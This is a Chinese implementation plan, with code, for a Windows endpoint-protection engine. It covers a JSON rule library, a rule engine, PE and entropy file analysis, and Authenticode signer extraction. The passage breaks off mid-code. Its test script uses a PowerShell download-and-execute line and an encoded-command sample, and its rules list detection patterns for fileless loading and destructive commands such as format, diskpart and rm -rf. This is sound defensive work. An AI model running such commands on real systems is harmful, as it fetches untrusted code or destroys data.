# 安全防护引擎增强 · 子项目 A：端点防护 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 在现有静默安全底座上构建统一端点防护引擎 security\_engine：外置规则引擎 + 文件/脚本/命令智能识别（规则+可选LLM）+ 勒索实时防护盾 + 启动项实时防护 + 原生 AMSI Provider DLL，全部真实 API、零硬编码、分级自动处置。

**Architecture:** 新建包 `src/zhuzhu_Copilot/core/security_engine/`，模块化检测器通过 `SecurityEngine` 统一事件流做置信度分级处置（高=自动隔离/终止，中=通知，低=仅审计日志）；规则库全部外置 `config/security_rules.json`（用户可覆盖 `%USERPROFILE%\.zhuzhu_Copilot\config\security_rules.json`）。AMSI 用原生 DLL（C）+ named pipe 与 Python 侧 `AmsiBridge` 判定。复用现有 `core/security.py` 隔离区与进程工具、`core/execution_guard.py` 命令工具。

**Tech Stack:** Python 3.13（ctypes/winreg/pywin32/COM），C（MinGW/MSVC 编译 AMSI DLL），PyQt6（设置界面），项目现有 Cython 打包链。

***

## 文件结构总览

```
config/security_rules.json                          [新建] 默认规则库（规则+处置策略+阈值+可信签名者+勒索扩展名）
src/zhuzhu_Copilot/core/security_engine/           [新建包]
├── __init__.py                                     [新建] 包导出
├── rules.py                                        [新建] 规则引擎
├── file_intel.py                                   [新建] 文件静态分析（PE/熵/字符串）
├── signature.py                                    [新建] 签名验证与签发者提取
├── script_intel.py                                 [新建] 脚本分析
├── llm_analyzer.py                                 [新建] 可选 LLM 深度分析
├── engine.py                                       [新建] 统一引擎（事件/处置/隔离/审计）
├── ransomware_shield.py                            [新建] 勒索防护盾（ReadDirectoryChangesW + Restart Manager）
├── startup_guard.py                                [新建] 启动项防护（RegNotifyChangeKeyValue）
├── command_intel.py                                [新建] 命令监控（WMI 订阅 + 快照降级）
└── amsi_bridge.py                                  [新建] AMSI named pipe 桥 + 注册表注册/反注册
build/amsi_provider/                                [新建]
├── amsi_provider.c                                 [新建] 原生 AMSI Provider DLL 源码
├── amsi_provider.def                               [新建] 导出表
└── build_amsi.ps1                                  [新建] 编译脚本（gcc/cl 自动探测）
src/zhuzhu_Copilot/ui/security_settings_dialog.py  [新建] 安全防护设置对话框
src/zhuzhu_Copilot/ui/main_window.py               [修改] SecurityMonitorWorker 接入引擎 + 防护设置按钮
scripts/_verify_rules_engine.py                     [新建]
scripts/_verify_file_intel.py                       [新建]
scripts/_verify_signature.py                        [新建]
scripts/_verify_script_intel.py                     [新建]
scripts/_verify_llm_analyzer.py                     [新建]
scripts/_verify_engine.py                           [新建]
scripts/_ransom_sim_child.py                        [新建] 勒索行为模拟子进程（测试用）
scripts/_verify_ransomware_shield.py                [新建]
scripts/_verify_startup_guard.py                    [新建]
scripts/_verify_command_intel.py                    [新建]
scripts/_verify_amsi_bridge.py                      [新建]
scripts/_verify_amsi_dll.py                         [新建] AMSI 端到端（注册→PowerShell→判定→反注册）
scripts/_verify_security_settings.py                [新建]
```

约定：验证脚本统一开头：

```python
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))
```

运行方式：项目根目录执行 `python scripts/_verify_xxx.py`；输出 PASS/FAIL 明细，退出码非 0 表示失败。每轮修改后运行 `python scripts/smoke_test.py` 回归。

***

### Task 1: 规则引擎 + 默认规则库

**Files:**

* Create: `config/security_rules.json`

* Create: `src/zhuzhu_Copilot/core/security_engine/__init__.py`

* Create: `src/zhuzhu_Copilot/core/security_engine/rules.py`

* Create: `scripts/_verify_rules_engine.py`

* [ ] **Step 1.1: 写验证脚本（先失败）**

```python
# scripts/_verify_rules_engine.py
import os, sys, hashlib, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.rules import RuleEngine

eng = RuleEngine()
check("默认规则库加载", len(eng._rules) >= 8, f"rules={len(eng._rules)}")

# pattern 匹配器：脚本类规则
hits = eng.match({"kind": "script", "script": 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")'},
                 category="script")
check("脚本无文件攻击规则命中", len(hits) >= 1, str([r.get("id") for r, _ in hits][:3]))
conf = eng.confidence({"kind": "script", "script": 'IEX (New-Object Net.WebClient).DownloadString("http://x/a")'},
                      category="script")
check("脚本无文件攻击置信度>=80", conf >= 80, str(conf))

# cmdline-regex 匹配器
hits = eng.match({"kind": "command", "cmdline": "powershell -EncodedCommand SFRUUA==",
                  "exe_name": "powershell.exe"}, category="command")
check("命令编码执行规则命中", len(hits) >= 1, str([r.get("id") for r, _ in hits]))

# extension 匹配器
hits = eng.match({"kind": "file", "name": "a.locked", "ext": ".locked"}, category="file")
check("勒索扩展名规则命中", len(hits) >= 1, str([r.get("id") for r, _ in hits]))

# ratio + length 组合（混淆检测）
big_b64 = "QWJD" * 80
hits = eng.match({"kind": "script", "script": big_b64}, category="script")
conf = eng.confidence({"kind": "script", "script": big_b64}, category="script")
check("base64 混淆高占比命中", conf >= 50, f"conf={conf}")

# hash 匹配器（运行期添加规则，验证 matcher 通路）
tmp = tempfile.mkdtemp(prefix="rules_")
data = os.urandom(64)
path = os.path.join(tmp, "x.bin")
with open(path, "wb") as f:
    f.write(data)
sha = hashlib.sha256(data).hexdigest()
eng.add_rule({"id": "hash.test", "category": "file", "confidence": 100,
              "matchers": [{"type": "hash", "params": {"sha256": [sha]}}]})
hits = eng.match({"kind": "file", "sha256": sha}, category="file")
check("哈希匹配器命中", any(r.get("id") == "hash.test" for r, _ in hits))
check("哈希匹配器不误报", not eng.match({"kind": "file", "sha256": "0" * 64}, category="file"))
os.remove(path); os.rmdir(tmp)

# pe-import 匹配器
hits = eng.match({"kind": "file", "imports": ["kernel32.dll!virtualalloc", "advapi32.dll"]},
                 category="file")
check("导入表可疑函数命中", len(hits) >= 1, str([r.get("id") for r, _ in hits]))

# action_policy 外置读取
check("处置策略读取", int(eng.policy.get("high", 0)) >= 50, str(eng.policy))

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 1.2: 运行验证（预期失败：模块不存在）**

Run: `python scripts/_verify_rules_engine.py`
Expected: 抛 `ModuleNotFoundError: No module named 'zhuzhu_Copilot.core.security_engine'`（FAIL）

* [ ] **Step 1.3: 创建默认规则库**

`config/security_rules.json`（新建，UTF-8，真实规则内容）：

```json
{
  "action_policy": {"high": 80, "mid": 40, "low": 0},
  "trusted_signers": ["microsoft", "adobe", "google", "intel", "nvidia", "tencent", "kingsoft"],
  "ransomware_extensions": [".locked", ".encrypted", ".crypt", ".crypted", ".crypto",
    ".locky", ".zepto", ".wncry", ".wcry", ".cerber", ".de-crypt", ".pay", ".vault", ".ryuk", ".phobos"],
  "thresholds": {
    "ransomware": {"window_s": 10, "rename_burst": 12, "newfile_burst": 20,
                   "entropy_min": 7.0, "trigger_score": 50}
  },
  "rules": [
    {"id": "script.encoded_command", "category": "script", "confidence": 85,
     "matchers": [{"type": "pattern", "params": {"field": "script", "ignore_case": true,
       "patterns": ["(?i)-enc(odedcommand)?\\s+[a-z0-9+/=]{80,}", "(?i)\\bencodedcommand\\b"]}}]},
    {"id": "script.liveload", "category": "script", "confidence": 90,
     "matchers": [{"type": "pattern", "params": {"field": "script", "ignore_case": true,
       "patterns": ["(?i)(iex\\s*\\(|invoke-expression|downloadstring|frombase64string\\s*\\()"]}}]},
    {"id": "script.obfuscation", "category": "script", "confidence": 55,
     "matchers": [{"type": "ratio", "params": {"field": "script", "charset": "base64", "min_ratio": 0.75}},
                  {"type": "length", "params": {"field": "script", "min": 120}}]},
    {"id": "command.liveload", "category": "command", "confidence": 90,
     "matchers": [{"type": "cmdline-regex", "params": {
       "pattern": "(?i)(iex\\s*\\(|invoke-expression|downloadstring|encodedcommand)"}}]},
    {"id": "command.destructive", "category": "command", "confidence": 60,
     "matchers": [{"type": "cmdline-regex", "params": {
       "pattern": "(?i)(format\\s+[a-z]:|diskpart|rm\\s+-rf|cipher\\s+/w|bcdedit\\s+/set)"}}]},
    {"id": "file.ransom_extension", "category": "file", "confidence": 80,
     "matchers": [{"type": "extension", "params": {"values": [".locked", ".encrypted", ".crypt", ".crypted",
       ".crypto", ".locky", ".zepto", ".wncry", ".wcry", ".cerber", ".de-crypt", ".pay", ".vault", ".ryuk", ".phobos"]}}]},
    {"id": "file.high_entropy_exe", "category": "file", "confidence": 45,
     "matchers": [{"type": "entropy", "params": {"min": 7.2}},
                  {"type": "pattern", "params": {"field": "path", "ignore_case": true,
                    "patterns": ["(?i)\\.(exe|dll|scr)$"]}}]},
    {"id": "file.packer", "category": "file", "confidence": 55,
     "matchers": [{"type": "section-name", "params": {"values": ["upx0", "upx1", ".petite", ".aspack",
       ".mpress", ".themida", ".vmp0", ".vmp1", ".enigma"]}}]},
    {"id": "file.suspicious_import", "category": "file", "confidence": 70,
     "matchers": [{"type": "pe-import", "params": {
       "any": ["virtualalloc", "virtualallocex", "writeprocessmemory", "createremotethread",
               "cryptacquirecontext", "isdebuggerpresent", "checkremotedebuggerpresent"]}}]},
    {"id": "startup.known_malware", "category": "startup", "confidence": 90,
     "matchers": [{"type": "pattern", "params": {"field": "name", "ignore_case": true,
       "patterns": ["(?i)(njrat|darkcomet|wannacry|locky|asyncrat|quasar|xmrig|minerd|poison|njw0rm)"]}}]},
    {"id": "startup.temp_path", "category": "startup", "confidence": 60,
     "matchers": [{"type": "path-regex", "params": {
       "pattern": "(?i)([\\\\/]temp[\\\\/]|[\\\\/]local[\\\\/]temp|%temp%)"}}]}
  ]
}
```

* [ ] **Step 1.4: 创建包与规则引擎**

`src/zhuzhu_Copilot/core/security_engine/__init__.py`：

```python
"""安全防护引擎：端点防护（规则引擎/文件脚本命令识别/勒索盾/启动项防护/AMSI）"""
```

`src/zhuzhu_Copilot/core/security_engine/rules.py`：

```python
"""规则引擎：加载外置规则库 security_rules.json，样本匹配返回命中规则与最高置信度。

规则库路径解析：
1. 内置默认: <项目根>/config/security_rules.json（打包后 _MEIPASS/config/security_rules.json）
2. 用户覆盖: %USERPROFILE%\\.zhuzhu_Copilot\\config\\security_rules.json（顶层键合并覆盖内置）
匹配器按类型注册式扩展（add_matcher），全部规则外置、零硬编码。
"""
import json
import os
import re
import sys
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()

_USER_RULES = Path(os.environ.get("USERPROFILE", str(Path.home()))) / ".zhuzhu_Copilot" / "config" / "security_rules.json"

_BASE64_SET = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
_ALNUM_SET = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")


def _bundled_rules() -> Path:
    if getattr(sys, "frozen", False):
        return Path(getattr(sys, "_MEIPASS", ".")) / "config" / "security_rules.json"
    return Path(__file__).resolve().parents[4] / "config" / "security_rules.json"


class RuleEngine:
    """外置规则引擎：match(sample, category) -> [(rule, 命中匹配器类型元组)]"""

    def __init__(self, rules_path: Optional[Path] = None):
        self._matchers: Dict[str, Callable[[dict, dict], bool]] = {
            "hash": self._match_hash,
            "pattern": self._match_pattern,
            "pe-import": self._match_pe_import,
            "entropy": self._match_entropy,
            "path-regex": self._match_path_regex,
            "cmdline-regex": self._match_cmdline_regex,
            "extension": self._match_extension,
            "ratio": self._match_ratio,
            "length": self._match_length,
            "section-name": self._match_section_name,
        }
        self._rules: List[dict] = []
        self.data: Dict[str, Any] = {}
        self.rules_path: Optional[Path] = None
        self.reload(rules_path)

    @property
    def policy(self) -> dict:
        return self.data.get("action_policy") or {"high": 80, "mid": 40}

    # ---------- 匹配器 ----------
    @staticmethod
    def _match_hash(sample: dict, p: dict) -> bool:
        for algo, wanted in p.items():
            got = str(sample.get(algo) or "").lower()
            values = wanted if isinstance(wanted, list) else [wanted]
            if got and any(str(v).lower() == got for v in values):
                return True
        return False

    @staticmethod
    def _match_pattern(sample: dict, p: dict) -> bool:
        text = sample.get(p.get("field") or "script") or ""
        patterns = p.get("patterns") or ([p["pattern"]] if p.get("pattern") else [])
        flags = re.IGNORECASE if p.get("ignore_case", True) else 0
        return any(re.search(pat, text, flags) for pat in patterns)

    @staticmethod
    def _match_pe_import(sample: dict, p: dict) -> bool:
        imports = {str(i).lower() for i in (sample.get("imports") or []) if i}
        if not imports:
            return False
        any_list = [str(x).lower() for x in (p.get("any") or [])]
        all_list = [str(x).lower() for x in (p.get("all") or [])]
        if any_list and any(any(x in imp for x in any_list) for imp in imports):
            return True
        return bool(all_list) and all(any(x in imp for x in all_list) for imp in imports)

    @staticmethod
    def _match_entropy(sample: dict, p: dict) -> bool:
        v = sample.get("entropy")
        if v is None:
            return False
        if "min" in p and float(v) < float(p["min"]):
            return False
        if "max" in p and float(v) > float(p["max"]):
            return False
        return True

    @staticmethod
    def _match_path_regex(sample: dict, p: dict) -> bool:
        text = sample.get("path") or ""
        return bool(text) and re.search(p.get("pattern") or "", text,
                                         re.IGNORECASE if p.get("ignore_case", True) else 0) is not None

    @staticmethod
    def _match_cmdline_regex(sample: dict, p: dict) -> bool:
        text = sample.get("cmdline") or ""
        return bool(text) and re.search(p.get("pattern") or "", text,
                                         re.IGNORECASE if p.get("ignore_case", True) else 0) is not None

    @staticmethod
    def _match_extension(sample: dict, p: dict) -> bool:
        ext = str(sample.get("ext") or "").lower()
        name = str(sample.get("name") or "").lower()
        values = [str(v).lower() for v in (p.get("values") or [])]
        return bool(ext and ext in values) or bool(name and any(name.endswith(v) for v in values))

    @staticmethod
    def _match_ratio(sample: dict, p: dict) -> bool:
        text = "".join(str(sample.get(p.get("field") or "script") or "").split())
        if not text:
            return False
        charset = str(p.get("charset") or "base64").lower()
        chars = _BASE64_SET if charset == "base64" else _ALNUM_SET if charset == "alnum" else set(charset)
        ratio = sum(1 for c in text if c in chars) / len(text)
        return ratio >= float(p.get("min_ratio") or 0.6)

    @staticmethod
    def _match_length(sample: dict, p: dict) -> bool:
        text = sample.get(p.get("field") or "script") or ""
        return len(text) >= int(p.get("min") or 0)

    @staticmethod
    def _match_section_name(sample: dict, p: dict) -> bool:
        names = {str(s.get("name") or "").lower() for s in (sample.get("sections") or [])}
        values = {str(v).lower() for v in (p.get("values") or [])}
        return bool(names & values)

    # ---------- 扩展与加载 ----------
    def add_matcher(self, name: str, fn: Callable[[dict, dict], bool]) -> None:
        self._matchers[name] = fn

    def add_rule(self, rule: dict) -> None:
        if isinstance(rule, dict) and rule.get("id") and rule.get("matchers"):
            self._rules.append(rule)

    def reload(self, rules_path: Optional[Path] = None) -> int:
        """重新加载：内置默认 + 用户覆盖（顶层键合并），返回规则条数"""
        self.data = {}
        base = _bundled_rules()
        for src in (base, rules_path or _USER_RULES):
            if src and src.exists():
                try:
                    loaded = json.loads(src.read_text(encoding="utf-8"))
                    if isinstance(loaded, dict):
                        self.data.update(loaded)
                except (OSError, ValueError) as e:
                    logger.warning("规则库加载失败 %s: %s", src, e)
        self.rules_path = _USER_RULES if _USER_RULES.exists() else base
        self._rules = [r for r in (self.data.get("rules") or []) if isinstance(r, dict)]
        return len(self._rules)

    def match(self, sample: dict, category: Optional[str] = None) -> List[Tuple[dict, Tuple[str, ...]]]:
        """返回 [(规则dict, 命中匹配器类型元组)]（按规则库顺序）"""
        out: List[Tuple[dict, Tuple[str, ...]]] = []
        for rule in self._rules:
            if category and rule.get("category") != category:
                continue
            if not rule.get("enabled", True):
                continue
            hit_types = []
            for m in (rule.get("matchers") or []):
                fn = self._matchers.get(m.get("type"))
                if fn is None or not fn(sample, m.get("params") or {}):
                    hit_types = []
                    break
                hit_types.append(m.get("type") or "?")
            if hit_types:
                out.append((rule, tuple(hit_types)))
        return out

    def confidence(self, sample: dict, category: Optional[str] = None) -> int:
        return max((int(r.get("confidence") or 0) for r, _ in self.match(sample, category)), default=0)
```

* [ ] **Step 1.5: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_rules_engine.py`
Expected: 全部 PASS，`TOTAL 0 FAILURES`，退出码 0

* [ ] **Step 1.6: 回归 + 提交**

Run: `python scripts/smoke_test.py`
Expected: 现有回归通过

```powershell
git add config/security_rules.json src/zhuzhu_Copilot/core/security_engine/__init__.py src/zhuzhu_Copilot/core/security_engine/rules.py scripts/_verify_rules_engine.py ; git commit -m "feat(security): 外置规则引擎与默认规则库（安全防护引擎A）"
```

***

### Task 2: 文件静态分析 file\_intel

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/file_intel.py`

* Create: `scripts/_verify_file_intel.py`

* [ ] **Step 2.1: 写验证脚本（先失败）**

```python
# scripts/_verify_file_intel.py
import os, sys, struct, shutil, tempfile
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)


def make_test_pe(path):
    """手工构造最小 PE32：.text + .idata 两节，导入 KERNEL32.dll!VirtualAlloc（真实 PE 结构）"""
    dll, func = b"KERNEL32.dll", b"VirtualAlloc"
    raw = bytearray(0x600)
    raw[0:2] = b"MZ"
    struct.pack_into("<I", raw, 0x3C, 0x80)
    raw[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", raw, 0x84, 0x14C, 2, 0, 0, 0, 0xE0, 0x0102)
    opt = 0x98
    struct.pack_into("<H", raw, opt, 0x10B)
    struct.pack_into("<I", raw, opt + 16, 0x1000)   # AddressOfEntryPoint
    struct.pack_into("<I", raw, opt + 20, 0x1000)   # BaseOfCode
    struct.pack_into("<I", raw, opt + 28, 0x400000)  # ImageBase
    struct.pack_into("<I", raw, opt + 32, 0x1000)   # SectionAlignment
    struct.pack_into("<I", raw, opt + 36, 0x200)    # FileAlignment
    struct.pack_into("<I", raw, opt + 56, 0x3000)   # SizeOfImage
    struct.pack_into("<I", raw, opt + 60, 0x200)    # SizeOfHeaders
    struct.pack_into("<H", raw, opt + 68, 3)        # Subsystem
    struct.pack_into("<I", raw, opt + 92, 16)       # NumberOfRvaAndSizes
    struct.pack_into("<II", raw, opt + 96 + 8, 0x2000, 40)  # Import 目录
    sec0, sec1 = 0x178, 0x178 + 40
    raw[sec0:sec0 + 8] = b".text\0\0\0"
    struct.pack_into("<IIIIIIHHI", raw, sec0 + 8, 0x1000, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020)
    raw[sec1:sec1 + 8] = b".idata\0\0"
    struct.pack_into("<IIIIIIHHI", raw, sec1 + 8, 0x1000, 0x2000, 0x200, 0x400, 0, 0, 0, 0, 0xC0000040)
    struct.pack_into("<IIIII", raw, 0x400, 0x2058, 0, 0, 0x2040, 0x2058)  # 导入描述符
    raw[0x440:0x440 + len(dll)] = dll                       # RVA 0x2040 dll 名
    struct.pack_into("<H", raw, 0x450, 0)                   # hint
    raw[0x452:0x452 + len(func)] = func                     # 函数名
    struct.pack_into("<II", raw, 0x458, 0x2050, 0)          # thunk 表 → 0x2050, 终止 0
    with open(path, "wb") as f:
        f.write(raw)


from zhuzhu_Copilot.core.security_engine import file_intel

tmp = tempfile.mkdtemp(prefix="fileintel_")
try:
    pe = os.path.join(tmp, "sample.exe")
    make_test_pe(pe)
    s = file_intel.analyze_file(pe)
    check("PE识别", s["pe"] is True)
    check("节区解析", [x["name"] for x in s["sections"]] == [".text", ".idata"], str(s["sections"]))
    check("导入表解析", "kernel32.dll!virtualalloc" in s["imports"], str(s["imports"][:5]))
    check("SHA256稳定且64位", len(s["sha256"]) == 64 and file_intel.sha256_of(pe) == s["sha256"])
    rnd = os.path.join(tmp, "rand.bin")
    with open(rnd, "wb") as f:
        f.write(os.urandom(64 * 1024))
    check("测试构造文件熵>7", file_intel.analyze_file(rnd)["entropy"] > 7.0)
    check("非PE文件识别", file_intel.analyze_file(rnd)["pe"] is False)
    check("纯零文件熵=0", file_intel.file_entropy(bytes(1024)) == 0.0)
    txt = os.path.join(tmp, "s.txt")
    with open(txt, "wb") as f:
        f.write(b"hello VirtualAlloc WScript.Shell mark")
    ss = file_intel.analyze_file(txt)
    check("可疑字符串抽取", "VirtualAlloc" in ss["strings"], ss["strings"][:60])
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 2.2: 运行验证（预期失败）**

Run: `python scripts/_verify_file_intel.py`
Expected: FAIL `ModuleNotFoundError`（模块未实现）

* [ ] **Step 2.3: 实现 file\_intel**

`src/zhuzhu_Copilot/core/security_engine/file_intel.py`：

```python
"""文件静态分析：SHA256 / PE 节区与导入表 / 信息熵 / 可打印字符串（纯标准库，真实文件读取）"""
import hashlib
import math
import os
import re
import struct
from typing import List, Set, Tuple

_HEAD_CAP = 32 * 1024 * 1024   # PE 结构解析读取上限
_STR_CAP = 8 * 1024 * 1024     # 字符串抽取读取上限


def sha256_of(path: str) -> str:
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            while True:
                chunk = f.read(1024 * 1024)
                if not chunk:
                    break
                h.update(chunk)
        return h.hexdigest()
    except OSError:
        return ""


def file_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    n = float(len(data))
    return -sum((c / n) * math.log2(c / n) for c in freq if c)


def extract_strings(data: bytes, min_len: int = 4) -> str:
    """抽取 ASCII 与 UTF-16LE 可打印字符串（去重，上限 32KB）"""
    out = set()
    for m in re.finditer(rb"[\x20-\x7e]{%d,}" % min_len, data):
        out.add(m.group().decode("ascii", "replace"))
    try:
        s16 = data.decode("utf-16-le", "ignore")
    except Exception:
        s16 = ""
    for m in re.finditer(r"[\u0020-\u007e]{%d,}" % min_len, s16):
        out.add(m.group())
    return "\n".join(sorted(out))[:32768]


def _parse_pe(buf: bytes) -> Tuple[List[dict], Set[str]]:
    """解析 PE 节区与导入表；非 PE 返回 ([], set())"""
    if len(buf) < 0x40 or buf[:2] != b"MZ":
        return [], set()
    e_lfanew = struct.unpack_from("<I", buf, 0x3C)[0]
    if e_lfanew + 24 > len(buf) or buf[e_lfanew:e_lfanew + 4] != b"PE\0\0":
        return [], set()
    nsec = struct.unpack_from("<H", buf, e_lfanew + 6)[0]
    opt = e_lfanew + 24
    if opt + 2 > len(buf):
        return [], set()
    magic = struct.unpack_from("<H", buf, opt)[0]
    if magic not in (0x10B, 0x20B):   # PE32 / PE32+
        return [], set()

    sections = []
    sec_off = opt + struct.unpack_from("<H", buf, e_lfanew + 20)[0]
    for i in range(min(nsec, 96)):
        off = sec_off + i * 40
        if off + 40 > len(buf):
            break
        name = buf[off:off + 8].rstrip(b"\0").decode("latin1", "replace")
        vsz, va, rsz, ro = struct.unpack_from("<IIII", buf, off + 8)
        sections.append({"name": name, "va": va, "vsize": vsz,
                         "raw_size": rsz, "raw_off": None if rsz == 0 else ro})

    def rva2off(rva: int):
        for s in sections:
            span = max(s["vsize"], s["raw_size"] or 0)
            if s["va"] <= rva < s["va"] + span and s["raw_off"] is not None:
                return s["raw_off"] + (rva - s["va"])
        return None

    if magic == 0x10B:
        dd_off, thunk, ordinal = opt + 96, 4, 0x80000000
    else:
        dd_off, thunk, ordinal = opt + 112, 8, 0x8000000000000000
    if dd_off + 16 > len(buf):
        return sections, set()

    imp_rva, _ = struct.unpack_from("<II", buf, dd_off + 8)
    imports: Set[str] = set()
    off = rva2off(imp_rva)
    for _ in range(64):
        if off is None or off + 20 > len(buf):
            break
        oft, _td, _fc, name_rva, ft = struct.unpack_from("<IIIII", buf, off)
        if oft == 0 and ft == 0:
            break
        if name_rva:
            no = rva2off(name_rva)
            if no is not None and no < len(buf):
                end = buf.find(b"\0", no, no + 256)
                dll = buf[no:end].decode("latin1", "replace") if end != -1 else ""
                if dll:
                    imports.add(dll)
                    to = rva2off(oft or ft)
                    for _ in range(512):
                        if to is None or to + thunk > len(buf):
                            break
                        val = struct.unpack_from("<I" if thunk == 4 else "<Q", buf, to)[0]
                        if val == 0:
                            break
                        if not (val & ordinal):
                            fo = rva2off(val)
                            if fo is not None and fo + 2 <= len(buf):
                                end2 = buf.find(b"\0", fo + 2, fo + 256)
                                if end2 != -1:
                                    fn = buf[fo + 2:end2].decode("latin1", "replace")
                                    if fn:
                                        imports.add(f"{dll}!{fn.lower()}")
                        to += thunk
        off += 20
    return sections, imports


def analyze_file(path: str) -> dict:
    """返回规则引擎样本 dict：{kind,path,name,ext,size,sha256,pe,sections,imports,entropy,strings}"""
    p = str(path)
    sample = {"kind": "file", "path": p, "name": os.path.basename(p),
              "ext": os.path.splitext(p)[1].lower(), "size": 0, "sha256": "",
              "pe": False, "sections": [], "imports": [], "entropy": 0.0, "strings": ""}
    if not os.path.isfile(p):
        return sample
    try:
        sample["size"] = os.path.getsize(p)
        sample["sha256"] = sha256_of(p)
        with open(p, "rb") as f:
            head = f.read(_HEAD_CAP)
        if not head:
            return sample
        sample["entropy"] = round(file_entropy(head[:256 * 1024]), 3)
        sample["strings"] = extract_strings(head[:_STR_CAP])
        sections, imports = _parse_pe(head)
        if sections:
            sample["pe"] = True
            sample["sections"] = sections
            sample["imports"] = sorted(imports)
    except OSError:
        pass
    return sample
```

* [ ] **Step 2.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_file_intel.py`
Expected: 全部 PASS，退出码 0

* [ ] **Step 2.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/file_intel.py scripts/_verify_file_intel.py ; git commit -m "feat(security): 文件静态分析模块（PE/熵/字符串）"
```

***

### Task 3: 签名验证与签发者提取 signature

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/signature.py`

* Create: `scripts/_verify_signature.py`

* [ ] **Step 3.1: 写验证脚本（先失败）**

```python
# scripts/_verify_signature.py
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.signature import signer_subject
from zhuzhu_Copilot.core import security as _sec

# Windows 系统自带签名文件的真实验证（kernel32.dll 恒为 Microsoft 签名）
k32 = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "kernel32.dll")
if os.path.isfile(k32):
    ok = _sec._has_valid_signature(k32)
    subject = signer_subject(k32) if ok else ""
    check("系统文件签名有效", ok is True, str(ok))
    check("签发者提取含 Microsoft", "microsoft" in subject.lower(), subject or "(empty)")
else:
    check("系统文件存在", False, k32)

# 无签名文件 → 提取为空
tmp = os.path.join(os.environ.get("TEMP", "."), "_verify_signature_unsigned.bin")
with open(tmp, "wb") as f:
    f.write(b"MZ" + os.urandom(128))
check("无签名签发者为空", signer_subject(tmp) == "")
os.remove(tmp)

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 3.2: 运行验证（预期失败）**

Run: `python scripts/_verify_signature.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 3.3: 实现 signature**

`src/zhuzhu_Copilot/core/security_engine/signature.py`：

```python
"""Authenticode 签名验证与签发者提取（crypt32 CryptQueryObject，纯 ctypes，真实 API）"""
import ctypes
import ctypes.wintypes as wt


def signer_subject(path: str) -> str:
    """提取第一个签名证书的简单显示名（CN）；无签名/失败返回空串"""
    try:
        crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
        CERT_QUERY_OBJECT_FILE = 0x1
        CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED = 1 << 10
        CERT_QUERY_FORMAT_FLAG_ALL = 0xFFE
        X509_ASN_ENCODING = 0x1
        PKCS_7_ASN_ENCODING = 0x10000
        CERT_NAME_SIMPLE_DISPLAY_TYPE = 4

        crypt32.CryptQueryObject.argtypes = [wt.DWORD, wt.LPCWSTR, wt.DWORD, wt.DWORD, wt.DWORD,
                                             ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                             ctypes.POINTER(wt.HANDLE), ctypes.POINTER(wt.HANDLE),
                                             ctypes.c_void_p]
        crypt32.CryptQueryObject.restype = wt.BOOL
        crypt32.CertFindCertificateInStore.argtypes = [wt.HANDLE, wt.DWORD, wt.DWORD, wt.DWORD,
                                                       ctypes.c_void_p, ctypes.c_void_p]
        crypt32.CertFindCertificateInStore.restype = ctypes.c_void_p
        crypt32.CertGetNameStringW.argtypes = [ctypes.c_void_p, wt.DWORD, wt.DWORD, ctypes.c_void_p,
                                               wt.LPWSTR, wt.DWORD]
        crypt32.CertGetNameStringW.restype = wt.DWORD
        crypt32.CertCloseStore.argtypes = [wt.HANDLE, wt.DWORD]

        h_store, h_msg = wt.HANDLE(), wt.HANDLE()
        ok = crypt32.CryptQueryObject(CERT_QUERY_OBJECT_FILE, path,
                                      CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
                                      CERT_QUERY_FORMAT_FLAG_ALL, 0,
                                      None, None, None, ctypes.byref(h_store),
                                      ctypes.byref(h_msg), None)
        if not ok or not h_store.value:
            return ""
        try:
            ctx = crypt32.CertFindCertificateInStore(
                h_store.value, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, 0, None, None)
            if not ctx:
                return ""
            buf = ctypes.create_unicode_buffer(512)
